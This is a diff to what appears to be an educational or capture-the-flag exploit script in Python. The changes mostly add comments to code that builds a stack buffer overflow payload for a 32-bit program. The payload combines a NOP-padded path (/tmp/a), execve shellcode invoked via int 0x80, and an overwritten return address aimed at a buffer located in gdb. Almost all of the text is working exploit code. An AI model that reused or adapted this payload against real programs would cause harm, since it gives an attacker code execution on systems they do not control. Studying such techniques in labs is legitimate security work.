@@ -28,25 +28,27 @@ def print_shell_string(shellcode):
 
 # On start we need to examine binary in gdb and find the address in which fgets writes buffer. Put it here
 buffer_start = 0xffffddac
-executable_path = b"/tmp/a"
+executable_path = b"/tmp/a"  # Path to our binary
 asm_shellcode = """
 mov    eax,0xb
 mov    ebx,{executable_address}
 xor    ecx,ecx
 mov    edx,ecx
 int    0x80 
-"""
-stack_shift = 80
+"""  # Shellcode to execute binary file in {executable_address} address
 
-# We need some shift because this area will be reused in other function
+stack_shift = 80  # We need to shift stack to point to our shellcode
+
+# We need some extra shift because this area will be reused in other function
 left_shift = 8
 data_area = b"\x90" * left_shift + executable_path + b'\x00'
 
-# Start of executable will be needed to point to it in shellcode
-executable_address = buffer_start + left_shift
-shellcode = asm(asm_shellcode.format(executable_address=executable_address))
-shellcode_address = buffer_start + len(data_area)
+executable_address = buffer_start + left_shift  # Address of our binary
+shellcode = asm(asm_shellcode.format(
+    executable_address=executable_address))  # Convert shellcode to bytes and insert address of binary
+shellcode_address = buffer_start + len(data_area)  # Address of shellcode
 
+# Create payload
 payload = (data_area + shellcode).ljust(stack_shift, b'\x90')
 payload += p32(shellcode_address)
 
